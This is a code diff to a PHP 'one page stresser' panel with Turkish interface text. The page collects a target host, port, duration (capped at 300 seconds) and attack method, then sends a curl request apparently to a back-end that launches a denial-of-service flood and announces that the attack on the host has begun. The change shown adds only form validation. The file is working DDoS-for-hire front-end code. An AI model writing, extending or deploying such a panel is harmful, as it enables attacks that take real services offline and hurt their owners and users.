@@ -18,12 +18,15 @@ Tek Sayfalık Stresser Projesi / One Page Stresser Project
 	</div>
 	<form class="login-form" action="" method="POST">
 		<?php 
-
 			if (isset($_POST['saldir'])) {
 				$host = htmlspecialchars($_POST['host']);
 				$port = htmlspecialchars($_POST['port']);
 				$time = htmlspecialchars($_POST['time']);
 				$method = htmlspecialchars($_POST['method']);
+				if(empty($host) || empty($port) || empty($time) || empty($method)){
+				echo '<h4 style=color:green; text-align: center;> Lütfen tüm alanları doldurun.';
+				die();
+				}else{
 				if($time <= 300){ // Max saldırı süresini belirler
 
 				$dogukanbey = curl_init();
@@ -36,7 +39,6 @@ Tek Sayfalık Stresser Projesi / One Page Stresser Project
 				curl_setopt($dogukanbey, CURLOPT_FOLLOWLOCATION, true);
 				$dogukansex = curl_exec($dogukanbey);
 				curl_close($dogukanbey);
-				
 				echo "<h4 style=\"color:green; text-align: center;\">".$host." adresine ".$time." saniye ".$method. " methoduyla saldırı başladı! </h4>";
 				header("Refresh: 2; url=index.php");
            }else{
@@ -44,6 +46,7 @@ Tek Sayfalık Stresser Projesi / One Page Stresser Project
            	header("Refresh: 2; url=index.php");
           	 }
            }
+	}
 		 ?>
 		<div class="input-field">
 			<i class="fas fa-crosshairs"></i>
